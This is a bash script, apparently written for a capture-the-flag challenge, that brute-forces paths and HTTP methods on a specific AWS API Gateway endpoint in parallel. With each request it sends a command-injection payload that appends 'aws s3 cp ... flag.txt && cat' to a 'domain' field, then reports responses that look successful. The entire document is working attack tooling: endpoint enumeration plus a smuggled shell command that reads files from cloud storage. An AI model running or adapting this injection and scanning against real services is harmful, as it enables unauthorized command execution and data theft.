#!/usr/bin/env bash
# probe.sh - hunt for the real integration on the API Gateway and try the injection
# Usage: ./probe.sh

BASE="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
STAGES=("dev")
PATHS=("nslookup" "nslookupv2" "dns" "resolve" "lookup" "query" "check" "ns" "ping" "lambda" "invoke" "api" "v1" "v2" "prod" "flag" "admin" "debug" "test" "internal")
METHODS=("GET" "POST" "PUT" "DELETE" "PATCH")

INJECTION='{"domain":"example.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}'
PLAIN='{"domain":"example.com"}'

CURL=/usr/bin/curl
JOBS=20   # parallel requests at once - raise/lower depending on your connection

COUNTER_FILE=$(mktemp)
echo 0 > "$COUNTER_FILE"

do_request() {
  local method="$1" url="$2" payload_name="$3" payload="$4"

  local raw
  raw=$($CURL -s -m 8 -X "$method" "$url" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    -w "\n___CODE___%{http_code}" 2>/dev/null)

  local code="${raw##*___CODE___}"
  local body="${raw%___CODE___*}"

  # atomic increment of the sent counter (flock avoids race conditions across parallel jobs)
  (
    flock -x 200
    count=$(cat "$COUNTER_FILE")
    echo $((count + 1)) > "$COUNTER_FILE"
  ) 200>"$COUNTER_FILE.lock"

  case "$body" in
    ""|*"Missing Authentication Token"*|*"Could not parse request body"*|*'"domain": "wip"'*|*'"domain":"wip"'*|*"Internal server error"*|*'"message":"Forbidden"'*|*'"message": "Forbidden"'*)
      return 0
      ;;
  esac

  printf '\n>>> HIT: %s %s [%s] -> HTTP %s\n%s\n----------------------------------------------------\n' \
    "$method" "$url" "$payload_name" "$code" "$body"
}
export -f do_request
export CURL COUNTER_FILE

# Build the full request list first so we know the total count
REQUESTS_FILE=$(mktemp)
for stage in "${STAGES[@]}"; do
  for path in "${PATHS[@]}"; do
    url="$BASE/$stage/$path"
    for method in "${METHODS[@]}"; do
      echo "$method|$url|PLAIN|$PLAIN" >> "$REQUESTS_FILE"
      echo "$method|$url|INJECTION|$INJECTION" >> "$REQUESTS_FILE"
    done
  done
done

TOTAL=$(wc -l < "$REQUESTS_FILE")

echo "Scanning stages x paths x methods x payloads (parallel x$JOBS)..."
echo "Total requests to send: $TOTAL"
echo "=================================================="

# Background progress reporter: prints sent/total every 10s until done
(
  while true; do
    sleep 10
    sent=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
    echo "[progress] $sent / $TOTAL requests sent"
    if [[ "$sent" -ge "$TOTAL" ]]; then
      break
    fi
  done
) &
PROGRESS_PID=$!

cat "$REQUESTS_FILE" | xargs -P "$JOBS" -I{} bash -c '
  IFS="|" read -r method url pname payload <<< "{}"
  do_request "$method" "$url" "$pname" "$payload"
'

kill "$PROGRESS_PID" 2>/dev/null
rm -f "$COUNTER_FILE" "$COUNTER_FILE.lock" "$REQUESTS_FILE"

echo ""
echo "=================================================="
echo "Scan complete. $TOTAL requests sent."
